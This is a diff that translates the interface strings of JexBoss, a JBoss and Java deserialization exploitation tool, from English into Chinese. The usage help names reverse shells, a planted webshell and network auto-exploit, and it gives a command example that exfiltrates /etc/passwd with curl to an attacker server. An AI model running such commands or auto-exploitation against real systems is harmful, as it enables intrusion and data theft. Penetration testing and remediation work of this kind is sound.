-                 " |                                                      |\n"
-                 " | @update: https://github.com/joaomatosf/jexboss       |\n"
-                 " #______________________________________________________#\n")
-    print_and_flush(RED1 + " @version: %s" % __version__)
+    print_and_flush(RED1 + "\n * ---- JexBoss: JBoss 验证与漏洞利用工具  ---- *\n"
+                			 " | *   		及其他Java反序列化漏洞	      * | \n"
+                			 " |						|\n"
+                 			 " | @作者:  João Filho Matos Figueiredo		|\n"
+                 			 " | @联系: joaomatosf@gmail.com			|\n"
+                			 " |						|\n"
+                			 " | @更新: https://github.com/joaomatosf/jexboss |\n"
+                			 " #______________________________________________#\n")
+    print_and_flush(RED1 + " @版本: %s" % __version__)
     print_and_flush (ENDC)
 
 
 def help_usage():
-    usage = (BOLD + BLUE + " Examples: [for more options, type python jexboss.py -h]\n" + ENDC +
-    BLUE + "\n For simple usage, you must provide the host name or IP address you\n"
-           " want to test [-host or -u]:\n" +
+    usage = (BOLD + BLUE + " 示例: [更多选项，请输入 python jexboss.py -h]\n" + ENDC +
+    BLUE + "\n 简单用法，您必须提供要测试的主机名或IP地址 [-host 或 -u]:\n" +
     GREEN + "\n  $ python jexboss.py -u https://site.com.br" +
 
-     BLUE + "\n\n For Java Deserialization Vulnerabilities in HTTP POST parameters. \n"
-            " This will ask for an IP address and port to try to get a reverse shell:\n" +
+     BLUE + "\n\n 检测HTTP POST参数中的Java反序列化漏洞。\n"
+            " 这将要求输入IP地址和端口以尝试获取反向SHELL:\n" +
      GREEN + "\n  $ python jexboss.py -u http://vulnerable_java_app/page.jsf --app-unserialize" +
 
-     BLUE + "\n\n For Java Deserialization Vulnerabilities in a custom HTTP parameter and \n"
-            " to send a custom command to be executed on the exploited server:\n" +
+     BLUE + "\n\n 检测自定义HTTP参数中的Java反序列化漏洞，\n"
+            " 并发送要在被利用服务器上执行的自定义命令:\n" +
      GREEN + "\n  $ python jexboss.py -u http://vulnerable_java_app/page.jsf --app-unserialize\n"
              "    -H parameter_name --cmd 'curl -d@/etc/passwd http://your_server'" +
 
-     BLUE + "\n\n For Java Deserialization Vulnerabilities in a Servlet (like Invoker):\n"+
+     BLUE + "\n\n 检测Servlet中的Java反序列化漏洞 (如Invoker):\n"+
      GREEN + "\n  $ python jexboss.py -u http://vulnerable_java_app/path --servlet-unserialize\n" +
 
-     BLUE + "\n\n To test Java Deserialization Vulnerabilities with DNS Lookup:\n" +
+     BLUE + "\n\n 使用DNS Lookup测试Java反序列化漏洞:\n" +
      GREEN + "\n  $ python jexboss.py -u http://vulnerable_java_app/path --gadget dns --dns test.yourdomain.com" +
 
-     BLUE + "\n\n For Jenkins CLI Deserialization Vulnerabilitie:\n"+
+     BLUE + "\n\n 检测Jenkins CLI反序列化漏洞 (CVE-2015-5317):\n"+
      GREEN + "\n  $ python jexboss.py -u http://vulnerable_java_app/jenkins --jenkins"+
 
-     BLUE + "\n\n For Apache Struts2 Vulnerabilities (CVE-2017-5638):\n" +
+     BLUE + "\n\n 检测Apache Struts2漏洞 (CVE-2017-5638):\n" +
      GREEN + "\n  $ python jexboss.py -u http://vulnerable_java_app/path.action --struts2\n" +
 
-     BLUE + "\n\n For auto scan mode, you must provide the network in CIDR format, "
-   "\n list of ports and filename for store results:\n" +
+     BLUE + "\n\n 自动扫描模式，您必须以CIDR格式提供网络，\n"
+   " 端口列表和存储结果的文件名:\n" +
     GREEN + "\n  $ python jexboss.py -mode auto-scan -network 192.168.0.0/24 -ports 8080,80 \n"
             "    -results report_auto_scan.log" +
 
-    BLUE + "\n\n For file scan mode, you must provide the filename with host list "
-           "\n to be scanned (one host per line) and filename for store results:\n" +
+    BLUE + "\n\n 文件扫描模式，您必须提供包含主机列表的文件名\n"
+           " (每行一个主机) 和存储结果的文件名:\n" +
     GREEN + "\n  $ python jexboss.py -mode file-scan -file host_list.txt -out report_file_scan.log\n" + ENDC)
     return usage
 
@@ -865,7 +878,7 @@ def network_args(string):
         else:
             value = ipaddress.ip_network(unicode(string))
     except:
-        msg = "%s is not a network address in CIDR format." % string
+        msg = "%s 不是CIDR格式的网络地址。" % string
         logging.error("%s is not a network address in CIDR format." % string)
         raise argparse.ArgumentTypeError(msg)
     return value
@@ -873,37 +886,37 @@ def network_args(string):
 
 def main():
     """
-    Run interactively. Call when the module is run by itself.
-    :return: Exit code
+    交互式运行。当模块自行运行时调用。
+    :return: 退出代码
     """
-    # check for Updates
+    # 检查更新
     if not gl_args.disable_check_updates:
         updates = _updates.check_updates()
         if updates:
-            print_and_flush(BLUE + BOLD + "\n\n * An update is available and is recommended update before continuing.\n" +
-                                          "   Do you want to update now?")
+            print_and_flush(BLUE + BOLD + "\n\n * 有可用更新，建议在继续前更新。\n" +
+                                          "   是否立即更新？")
             if not sys.stdout.isatty():
-                print_and_flush("   YES/no? ", same_line=True)
+                print_and_flush("   是/否? ", same_line=True)
                 pick = input().lower() if version_info[0] >= 3 else raw_input().lower()
             else:
-                pick = input("   YES/no? ").lower() if version_info[0] >= 3 else raw_input("   YES/no? ").lower()
+                pick = input("   是/否? ").lower() if version_info[0] >= 3 else raw_input("   是/否? ").lower()
 
             print_and_flush(ENDC)
             if pick != "no":
                 updated = _updates.auto_update()
                 if updated:
-                    print_and_flush(GREEN + BOLD + "\n * The JexBoss has been successfully updated. Please run again to enjoy the updates.\n" +ENDC)
+                    print_and_flush(GREEN + BOLD + "\n * JexBoss 已成功更新。请重新运行以享受更新。\n" +ENDC)
                     exit(0)
                 else:
-                    print_and_flush(RED + BOLD + "\n\n * An error occurred while updating the JexBoss. Please try again..\n" +ENDC)
+                    print_and_flush(RED + BOLD + "\n\n * 更新 JexBoss 时出错。请重试..\n" +ENDC)
                     exit(1)
 
     vulnerables = False
-    # check vulnerabilities for standalone mode
+    # 独立模式下的漏洞检查
     if gl_args.mode == 'standalone':
         url = gl_args.host
         scan_results = check_vul(url)
-        # performs exploitation for jboss vulnerabilities
+        # 对JBoss漏洞执行利用
         for vector in scan_results:
             if scan_results[vector] == 200 or scan_results[vector] == 500:
                 vulnerables = True
@@ -912,29 +925,29 @@ def main():
                 else:
 
                     if vector == "Application Deserialization":
-                        msg_confirm = "   If successful, this operation will provide a reverse shell. You must enter the\n" \
-                                      "   IP address and Port of your listening server.\n"
+                        msg_confirm = "   如果成功，此操作将提供反向SHELL。您必须输入\n" \
+                                      "   监听服务器的IP地址和端口。\n"
                     else:
-                        msg_confirm = "   If successful, this operation will provide a simple command shell to execute \n" \
-                                      "   commands on the server..\n"
+                        msg_confirm = "   如果成功，此操作将提供简单的命令SHELL来在\n" \
+                                      "   服务器上执行命令。\n"
 
-                    print_and_flush(BLUE + "\n\n * Do you want to try to run an automated exploitation via \"" +
-                          BOLD + vector + NORMAL + "\" ?\n" +
+                    print_and_flush(BLUE + "\n\n * 是否尝试通过 \"" +
+                          BOLD + vector + NORMAL + "\" 运行自动化利用？\n" +
                           msg_confirm +
-                          RED + "   Continue only if you have permission!" + ENDC)
+                          RED + "   仅在您拥有权限时继续！" + ENDC)
                     if not sys.stdout.isatty():
-                        print_and_flush("   yes/NO? ", same_line=True)
+                        print_and_flush("   是/否? ", same_line=True)
                         pick = input().lower() if version_info[0] >= 3 else raw_input().lower()
                     else:
-                        pick = input("   yes/NO? ").lower() if version_info[0] >= 3 else raw_input("   yes/NO? ").lower()
+                        pick = input("   是/否? ").lower() if version_info[0] >= 3 else raw_input("   是/否? ").lower()
 
                     if pick == "yes":
                         auto_exploit(url, vector)
 
-    # check vulnerabilities for auto scan mode
+    # 自动扫描模式下的漏洞检查
     elif gl_args.mode == 'auto-scan':
         file_results = open(gl_args.results, 'w')
-        file_results.write("JexBoss Scan Mode Report\n\n")
+        file_results.write("JexBoss 扫描模式报告\n\n")
         for ip in gl_args.network.hosts():
             if gl_interrupted: break
             for port in gl_args.ports.split(","):
@@ -947,20 +960,20 @@ def main():
                             if gl_args.auto_exploit:
                                 result_exploit = auto_exploit(url, key)
                                 if result_exploit:
-                                    file_results.write("{0}:\t[EXPLOITED VIA {1}]\n".format(url, key))
+                                    file_results.write("{0}:\t[已通过 {1} 利用]\n".format(url, key))
                                 else:
-                                    file_results.write("{0}:\t[FAILED TO EXPLOITED VIA {1}]\n".format(url, key))
+                                    file_results.write("{0}:\t[未能通过 {1} 利用]\n".format(url, key))
                             else:
-                                file_results.write("{0}:\t[POSSIBLY VULNERABLE TO {1}]\n".format(url, key))
+                                file_results.write("{0}:\t[可能对 {1} 易受攻击]\n".format(url, key))
 
                             file_results.flush()
                 else:
-                    print_and_flush (RED+"\n * Host %s:%s does not respond."% (ip,port)+ENDC)
+                    print_and_flush (RED+"\n * 主机 %s:%s 无响应。"% (ip,port)+ENDC)
         file_results.close()
-    # check vulnerabilities for file scan mode
+    # 文件扫描模式下的漏洞检查
     elif gl_args.mode == 'file-scan':
         file_results = open(gl_args.out, 'w')
-        file_results.write("JexBoss Scan Mode Report\n\n")
+        file_results.write("JexBoss 扫描模式报告\n\n")
         file_input = open(gl_args.file, 'r')
         for url in file_input.readlines():
             if gl_interrupted: break
@@ -975,58 +988,58 @@ def main():
                         if gl_args.auto_exploit:
                             result_exploit = auto_exploit(url, key)
                             if result_exploit:
-                                file_results.write("{0}:\t[EXPLOITED VIA {1}]\n".format(url, key))
+                                file_results.write("{0}:\t[已通过 {1} 利用]\n".format(url, key))
                             else:
-                                file_results.write("{0}:\t[FAILED TO EXPLOITED VIA {1}]\n".format(url, key))
+                                file_results.write("{0}:\t[未能通过 {1} 利用]\n".format(url, key))
                         else:
-                            file_results.write("{0}:\t[POSSIBLY VULNERABLE TO {1}]\n".format(url, key))
+                            file_results.write("{0}:\t[可能对 {1} 易受攻击]\n".format(url, key))
 
                         file_results.flush()
             else:
-                print_and_flush (RED + "\n * Host %s:%s does not respond." % (ip, port) + ENDC)
+                print_and_flush (RED + "\n * 主机 %s:%s 无响应。" % (ip, port) + ENDC)
         file_results.close()
 
-    # resume results
+    # 结果总结
     if vulnerables:
         banner()
-        print_and_flush(RED + BOLD+" Results: potentially compromised server!" + ENDC)
+        print_and_flush(RED + BOLD+" 结果: 可能存在安全漏洞的服务器！" + ENDC)
         if gl_args.mode  == 'file-scan':
-            print_and_flush(RED + BOLD + " ** Check more information on file {0} **".format(gl_args.out) + ENDC)
+            print_and_flush(RED + BOLD + " ** 更多信息请查看文件 {0} **".format(gl_args.out) + ENDC)
         elif gl_args.mode == 'auto-scan':
-            print_and_flush(RED + BOLD + " ** Check more information on file {0} **".format(gl_args.results) + ENDC)
+            print_and_flush(RED + BOLD + " ** 更多信息请查看文件 {0} **".format(gl_args.results) + ENDC)
 
         print_and_flush(GREEN + " ---------------------------------------------------------------------------------\n"
-             +BOLD+   " Recommendations: \n" +ENDC+
-              GREEN+  " - Remove web consoles and services that are not used, eg:\n"
+             +BOLD+   " 建议: \n" +ENDC+
+              GREEN+  " - 移除未使用的Web控制台和服务，例如:\n"
                       "    $ rm web-console.war http-invoker.sar jmx-console.war jmx-invoker-adaptor-server.sar admin-console.war\n"
-                      " - Use a reverse proxy (eg. nginx, apache, F5)\n"
-                      " - Limit access to the server only via reverse proxy (eg. DROP INPUT POLICY)\n"
-                      " - Search vestiges of exploitation within the directories \"deploy\" and \"management\".\n"
-                      " - Do NOT TRUST serialized objects received from the user\n"
-                      " - If possible, stop using serialized objects as input!\n"
-                      " - If you need to work with serialization, consider migrating to the Gson lib.\n"
-                      " - Use a strict whitelist with Look-ahead[3] before deserialization\n"
-                      " - For a quick (but not definitive) remediation for the viewState input, store the state \n"
-                      "   of the view components on the server (this will increase the heap memory consumption): \n"
-                      "      In web.xml, change the \"client\" parameter to \"server\" on STATE_SAVING_METHOD.\n"
-                      " - Upgrade Apache Struts: https://cwiki.apache.org/confluence/display/WW/S2-045\n"
-                      "\n References:\n"
+                      " - 使用反向代理 (如 nginx, apache, F5)\n"
+                      " - 仅通过反向代理限制对服务器的访问 (例如 DROP INPUT POLICY)\n"
+                      " - 在 \"deploy\" 和 \"management\" 目录中搜索利用痕迹。\n"
+                      " - 不要信任来自用户的序列化对象\n"
+                      " - 如果可能，停止使用序列化对象作为输入！\n"
+                      " - 如果需要处理序列化，考虑迁移到Gson库。\n"
+                      " - 在反序列化前使用严格的白名单和Look-ahead[3]\n"
+                      " - 对于viewState输入的快速（非最终）修复，将视图组件的状态\n"
+                      "   存储在服务器端（这将增加堆内存消耗）: \n"
+                      "      在web.xml中，将STATE_SAVING_METHOD的\"client\"参数改为\"server\"。\n"
+                      " - 升级Apache Struts: https://cwiki.apache.org/confluence/display/WW/S2-045\n"
+                      "\n 参考:\n"
                       "   [1] - https://developer.jboss.org/wiki/SecureTheJmxConsole\n"
                       "   [2] - https://issues.jboss.org/secure/attachment/12313982/jboss-securejmx.pdf\n"
                       "   [3] - https://www.ibm.com/developerworks/library/se-lookahead/\n"
                       "   [4] - https://www.owasp.org/index.php/Deserialization_of_untrusted_data\n"
                       "\n"
-                      " - If possible, discard this server!\n"
+                      " - 如果可能，弃用此服务器！\n"
                       " ---------------------------------------------------------------------------------")
     else:
-        print_and_flush(GREEN + "\n\n * Results: \n" +
-              "   The server is not vulnerable to bugs tested ... :D\n" + ENDC)
-    # infos
-    print_and_flush(ENDC + " * Info: review, suggestions, updates, etc: \n" +
+        print_and_flush(GREEN + "\n\n * 结果: \n" +
+              "   服务器不易受测试的漏洞影响... :D\n" + ENDC)
+    # 信息
+    print_and_flush(ENDC + " * 信息: 审查、建议、更新等: \n" +
           "   https://github.com/joaomatosf/jexboss\n")
 
-    print_and_flush(GREEN + BOLD + " * DONATE: " + ENDC + "Please consider making a donation to help improve this tool,\n" +
-          GREEN + BOLD + " * Bitcoin Address: " + ENDC + " 14x4niEpfp7CegBYr3tTzTn4h6DAnDCD9C \n" )
+    print_and_flush(GREEN + BOLD + " * 捐赠: " + ENDC + "请考虑捐赠以帮助改进此工具，\n" +
+          GREEN + BOLD + " * 比特币地址: " + ENDC + " 14x4niEpfp7CegBYr3tTzTn4h6DAnDCD9C \n" )
 
 
 print_and_flush(ENDC)
@@ -1039,102 +1052,102 @@ if __name__ == "__main__":
 
     parser = argparse.ArgumentParser(
         formatter_class=argparse.RawDescriptionHelpFormatter,
-        #description="JexBoss v%s: JBoss verify and EXploitation Tool" %__version,
+        #description="JexBoss v%s: JBoss验证与漏洞利用工具" %__version,
         description=textwrap.dedent(RED1 +
-               "\n # --- JexBoss: Jboss verify and EXploitation Tool  --- #\n"
-                 " |    And others Java Deserialization Vulnerabilities   | \n"
-                 " |                                                      |\n"
-                 " | @author:  João Filho Matos Figueiredo                |\n"
-                 " | @contact: joaomatosf@gmail.com                       |\n"
-                 " |                                                      |\n"
-                 " | @updates: https://github.com/joaomatosf/jexboss      |\n"
+               "\n # --- JexBoss: JBoss 验证与漏洞利用工具  --- #\n"
+                 " |    及其他Java反序列化漏洞   | \n"
+                 " |                                                    |\n"
+                 " | @作者:  João Filho Matos Figueiredo                |\n"
+                 " | @联系: joaomatosf@gmail.com                        |\n"
+                 " |                                                   |\n"
+                 " | @更新: https://github.com/joaomatosf/jexboss       |\n"
                  " #______________________________________________________#\n"
-                 " @version: " + __version__ + "\n" + help_usage()),
+                 " @版本: " + __version__ + "\n" + help_usage()),
         epilog="",
         prog="JexBoss"
     )
 
-    group_standalone = parser.add_argument_group('Standalone mode')
-    group_advanced = parser.add_argument_group('Advanced Options (USE WHEN EXPLOITING JAVA UNSERIALIZE IN APP LAYER)')
-    group_auto_scan = parser.add_argument_group('Auto scan mode')
-    group_file_scan = parser.add_argument_group('File scan mode')
+    group_standalone = parser.add_argument_group('独立模式')
+    group_advanced = parser.add_argument_group('高级选项 (在应用层利用JAVA反序列化时使用)')
+    group_auto_scan = parser.add_argument_group('自动扫描模式')
+    group_file_scan = parser.add_argument_group('文件扫描模式')
 
-    # optional parameters ---------------------------------------------------------------------------------------
+    # 可选参数 ---------------------------------------------------------------------------------------
     parser.add_argument('--version', action='version', version='%(prog)s ' + __version__)
-    parser.add_argument("--auto-exploit", "-A", help="Send exploit code automatically (USE ONLY IF YOU HAVE PERMISSION!!!)",
+    parser.add_argument("--auto-exploit", "-A", help="自动发送漏洞利用代码 (仅在您拥有权限时使用!!!)",
                         action='store_true')
-    parser.add_argument("--disable-check-updates", "-D", help="Disable two updates checks: 1) Check for updates "
-                        "performed by the webshell in exploited server at http://webshell.jexboss.net/jsp_version.txt and 2) check for updates "
-                        "performed by the jexboss client at http://joaomatosf.com/rnp/releases.txt",
+    parser.add_argument("--disable-check-updates", "-D", help="禁用两项更新检查: 1) 由被利用服务器中的webshell执行\n"
+                        "的更新检查 (http://webshell.jexboss.net/jsp_version.txt) 和 2) 由jexboss客户端执行\n"
+                        "的更新检查 (http://joaomatosf.com/rnp/releases.txt)",
                         action='store_true')
-    parser.add_argument('-mode', help="Operation mode (DEFAULT: standalone)", choices=['standalone', 'auto-scan', 'file-scan'], default='standalone')
+    parser.add_argument('-mode', help="操作模式 (默认: standalone)", choices=['standalone', 'auto-scan', 'file-scan'], default='standalone')
     parser.add_argument("--app-unserialize", "-j",
-                        help="Check for java unserialization vulnerabilities in HTTP parameters (eg. javax.faces.ViewState, "
-                             "oldFormData, etc)", action='store_true')
+                        help="检查HTTP参数中的Java反序列化漏洞 (例如 javax.faces.ViewState, "
+                             "oldFormData 等)", action='store_true')
     parser.add_argument("--servlet-unserialize", "-l",
-                        help="Check for java unserialization vulnerabilities in Servlets (like Invoker interfaces)",
+                        help="检查Servlet中的Java反序列化漏洞 (如Invoker接口)",
                         action='store_true')
-    parser.add_argument("--jboss", help="Check only for JBOSS vectors.", action='store_true')
-    parser.add_argument("--jenkins",  help="Check only for Jenkins CLI vector (CVE-2015-5317).", action='store_true')
-    parser.add_argument("--struts2", help="Check only for Struts2 Jakarta Multipart parser (CVE-2017-5638).", action='store_true')
-    parser.add_argument("--jmxtomcat", help="Check JMX JmxRemoteLifecycleListener in Tomcat (CVE-2016-8735 and "
-                                            "CVE-2016-3427). OBS: Will not be checked by default.", action='store_true')
+    parser.add_argument("--jboss", help="仅检查JBOSS向量。", action='store_true')
+    parser.add_argument("--jenkins",  help="仅检查Jenkins CLI向量 (CVE-2015-5317)。", action='store_true')
+    parser.add_argument("--struts2", help="仅检查Struts2 Jakarta Multipart解析器 (CVE-2017-5638)。", action='store_true')
+    parser.add_argument("--jmxtomcat", help="检查Tomcat中的JMX JmxRemoteLifecycleListener (CVE-2016-8735 和 "
+                                            "CVE-2016-3427)。注意: 默认情况下不会检查此漏洞。", action='store_true')
 
-    parser.add_argument('--proxy', "-P", help="Use a http proxy to connect to the target URL (eg. -P http://192.168.0.1:3128)", )
-    parser.add_argument('--proxy-cred', "-L", help="Proxy authentication credentials (eg -L name:password)", metavar='LOGIN:PASS')
-    parser.add_argument('--jboss-login', "-J", help="JBoss login and password for exploit admin-console in JBoss 5 and JBoss 6 "
-                                                    "(default: admin:admin)", metavar='LOGIN:PASS', default='admin:admin')
-    parser.add_argument('--timeout', help="Seconds to wait before timeout connection (default 3)", default=3, type=int)
+    parser.add_argument('--proxy', "-P", help="使用HTTP代理连接到目标URL (例如 -P http://192.168.0.1:3128)", )
+    parser.add_argument('--proxy-cred', "-L", help="代理认证凭据 (例如 -L name:password)", metavar='用户名:密码')
+    parser.add_argument('--jboss-login', "-J", help="用于在JBoss 5和JBoss 6中利用admin-console的JBoss登录凭据 "
+                                                    "(默认: admin:admin)", metavar='用户名:密码', default='admin:admin')
+    parser.add_argument('--timeout', help="连接超时前的等待秒数 (默认 3)", default=3, type=int)
 
-    parser.add_argument('--cookies', help="Specify cookies for Struts 2 Exploit. Use this to test features that require authentication. "
-                                         "Format: \"NAME1=VALUE1; NAME2=VALUE2\" (eg. --cookie \"JSESSIONID=24517D9075136F202DCE20E9C89D424D\""
-                        , type=str, metavar='NAME=VALUE')
-    #parser.add_argument('--retries', help="Retries when the connection timeouts (default 3)", default=3, type=int)
+    parser.add_argument('--cookies', help="为Struts 2漏洞利用指定Cookie。用于测试需要认证的功能。"
+                                         "格式: \"名称1=值1; 名称2=值2\" (例如 --cookie \"JSESSIONID=24517D9075136F202DCE20E9C89D424D\""
+                        , type=str, metavar='名称=值')
+    #parser.add_argument('--retries', help="连接超时时的重试次数 (默认 3)", default=3, type=int)
 
-    # advanced parameters ---------------------------------------------------------------------------------------
-    group_advanced.add_argument("--reverse-host", "-r", help="Remote host address and port for reverse shell when exploiting "
-                                                             "Java Deserialization Vulnerabilities in application layer "
-                                                             "(for now, working only against *nix systems)"
-                                                             "(eg. 192.168.0.10:1331)", type=str, metavar='RHOST:RPORT')
+    # 高级参数 ---------------------------------------------------------------------------------------
+    group_advanced.add_argument("--reverse-host", "-r", help="当在应用层利用Java反序列化漏洞时，"
+                                                             "用于反向SHELL的远程主机地址和端口 "
+                                                             "(目前仅支持*nix系统)"
+                                                             "(例如 192.168.0.10:1331)", type=str, metavar='RHOST:RPORT')
     group_advanced.add_argument("--cmd", "-x",
-                                help="Send specific command to run on target (eg. curl -d @/etc/passwd http://your_server)"
-                                     , type=str, metavar='CMD')
-    group_advanced.add_argument("--dns", help="Specifies the dns query for use with \"dns\" Gadget", type=str, metavar='URL')
-    group_advanced.add_argument("--windows", "-w", help="Specifies that the commands are for rWINDOWS System$ (cmd.exe)",
+                                help="在目标上运行的特定命令 (例如 curl -d @/etc/passwd http://your_server)"
+                                     , type=str, metavar='命令')
+    group_advanced.add_argument("--dns", help="为\"dns\" Gadget指定DNS查询", type=str, metavar='URL')
+    group_advanced.add_argument("--windows", "-w", help="指定命令用于Windows系统 (cmd.exe)",
                                 action='store_true')
-    group_advanced.add_argument("--post-parameter", "-H", help="Specify the parameter to find and inject serialized objects into it."
-                                                               " (egs. -H javax.faces.ViewState or -H oldFormData (<- Hi PayPal =X) or others)"
-                                                               " (DEFAULT: javax.faces.ViewState)",
-                                                                 default='javax.faces.ViewState', metavar='PARAMETER')
-    group_advanced.add_argument("--show-payload", "-t", help="Print the generated payload.",
+    group_advanced.add_argument("--post-parameter", "-H", help="指定要查找并注入序列化对象的参数。"
+                                                               "(例如 -H javax.faces.ViewState 或 -H oldFormData (<- 嗨 PayPal =X) 或其他)"
+                                                               "(默认: javax.faces.ViewState)",
+                                                                 default='javax.faces.ViewState', metavar='参数')
+    group_advanced.add_argument("--show-payload", "-t", help="打印生成的payload。",
                                 action='store_true')
-    group_advanced.add_argument("--gadget", help="Specify the type of Gadget to generate the payload automatically."
-                                                 " (DEFAULT: commons-collections3.1 or groovy1 for JenKins)",
+    group_advanced.add_argument("--gadget", help="指定用于自动生成payload的Gadget类型。"
+                                                 "(默认: commons-collections3.1 或 Jenkins 的 groovy1)",
                                     choices=['commons-collections3.1', 'commons-collections4.0', 'jdk7u21', 'jdk8u20', 'groovy1', 'dns'],
                                     default='commons-collections3.1')
-    group_advanced.add_argument("--load-gadget", help="Provide your own gadget from file (a java serialized object in RAW mode)",
-                                metavar='FILENAME')
+    group_advanced.add_argument("--load-gadget", help="从文件提供您自己的gadget (RAW格式的Java序列化对象)",
+                                metavar='文件名')
     group_advanced.add_argument("--force", "-F",
-                                help="Force send java serialized gadgets to URL informed in -u parameter. This will "
-                                     "send the payload in multiple formats (eg. RAW, GZIPED and BASE64) and with "
-                                     "different Content-Types.",action='store_true')
+                                help="强制向-u参数指定的URL发送Java序列化gadgets。这将"
+                                     "以多种格式 (例如 RAW, GZIPED 和 BASE64) 和不同的"
+                                     "内容类型发送payload。",action='store_true')
 
-    # required parameters ---------------------------------------------------------------------------------------
-    group_standalone.add_argument("-host", "-u", help="Host address to be checked (eg. -u http://192.168.0.10:8080)",
+    # 必需参数 ---------------------------------------------------------------------------------------
+    group_standalone.add_argument("-host", "-u", help="要检查的主机地址 (例如 -u http://192.168.0.10:8080)",
                                   type=str)
 
-    # scan's mode parameters ---------------------------------------------------------------------------------------
-    group_auto_scan.add_argument("-network", help="Network to be checked in CIDR format (eg. 10.0.0.0/8)",
+    # 扫描模式参数 ---------------------------------------------------------------------------------------
+    group_auto_scan.add_argument("-network", help="以CIDR格式检查的网络 (例如 10.0.0.0/8)",
                             type=network_args, default='192.168.0.0/24')
-    group_auto_scan.add_argument("-ports", help="List of ports separated by commas to be checked for each host "
-                                                "(eg. 8080,8443,8888,80,443)", type=str, default='8080,80')
-    group_auto_scan.add_argument("-results", help="File name to store the auto scan results", type=str,
-                                 metavar='FILENAME', default='jexboss_auto_scan_results.log')
+    group_auto_scan.add_argument("-ports", help="要检查的端口列表，用逗号分隔 "
+                                                "(例如 8080,8443,8888,80,443)", type=str, default='8080,80')
+    group_auto_scan.add_argument("-results", help="存储自动扫描结果的文件名", type=str,
+                                 metavar='文件名', default='jexboss_auto_scan_results.log')
 
-    group_file_scan.add_argument("-file", help="Filename with host list to be scanned (one host per line)",
-                                 type=str, metavar='FILENAME_HOSTS')
-    group_file_scan.add_argument("-out", help="File name to store the file scan results", type=str,
-                                 metavar='FILENAME_RESULTS', default='jexboss_file_scan_results.log')
+    group_file_scan.add_argument("-file", help="包含要扫描的主机列表的文件名 (每行一个主机)",
+                                 type=str, metavar='主机列表文件')
+    group_file_scan.add_argument("-out", help="存储文件扫描结果的文件名", type=str,
+                                 metavar='结果文件', default='jexboss_file_scan_results.log')
 
     gl_args = parser.parse_args()
 
@@ -1162,5 +1175,3 @@ if __name__ == '__testing__':
     timeout = Timeout(connect=1.0, read=3.0)
     gl_http_pool = PoolManager(timeout=timeout, cert_reqs='CERT_NONE')
     _exploits.set_http_pool(gl_http_pool)
-
-
